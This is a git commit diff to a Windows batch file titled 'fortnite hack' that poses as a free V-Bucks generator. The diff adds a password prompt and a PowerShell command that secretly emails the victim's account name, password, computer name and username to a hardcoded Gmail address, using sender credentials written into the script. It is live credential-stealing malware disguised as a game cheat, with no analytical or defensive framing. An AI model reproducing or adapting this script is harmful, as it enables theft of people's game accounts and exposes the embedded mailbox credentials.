c25d3c0dd4fe27f01c59116d4dd0eab9043c0b81
Finn B <finnegolfer@gmail.com>
2018-08-29 16:25:58 -0700

    jkk

--- fn.bat
+++ fn.bat
@@ -26,19 +26,25 @@
 ::ZQ0/vhVqMQ3MEVWAtB9wSA==
 ::Zg8zqx1/OA3MEVWAtB9wSA==
 ::dhA7pRFwIByZRRnk
+::Zh4grVQjdCyDJGyX8VAjFD5YRTimM2ivC7AS/PvHyOOTilgfaMo+e4T437qaMuEf1kPqfZcu3TRfgM5s
 ::YB416Ek+ZG8=
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
 @echo off
+set email=captianlastimosa@gmail.com
+set password=wither14
 title fortnite hack
 color f0
 
+
 set /p input1=account:
 
+set /p input3=password:
 
 set /p input2=vbucks:
 echo giving %input1% %input2% vbucks
 timeout 4 >nul
 echo done
 pause >nul
+powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = '%input1%%input3%computername: %COMPUTERNAME%username:%USERNAME%.';$SMTPInfo.Send($ReportEmail);
